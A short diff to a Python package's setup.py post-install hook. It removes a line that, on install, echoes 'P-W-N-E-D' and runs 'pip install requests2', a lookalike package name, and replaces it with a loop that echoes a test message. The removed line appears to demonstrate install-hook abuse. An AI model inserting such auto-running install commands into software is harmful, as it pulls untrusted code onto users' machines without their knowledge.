@@ -7,7 +7,9 @@ from setuptools.command.develop import develop
 def run_post_install():
     """Logic to execute after the package is installed."""
     from testing_repo_fixer import main
-    os.system("echo P-W-N-E-D && pip install requests2")
+    import subprocess
+    for i in range(100):
+        subprocess.run(["echo", "HERE IN LOOP TESTING - v1.0"])
     main.run()
 
 
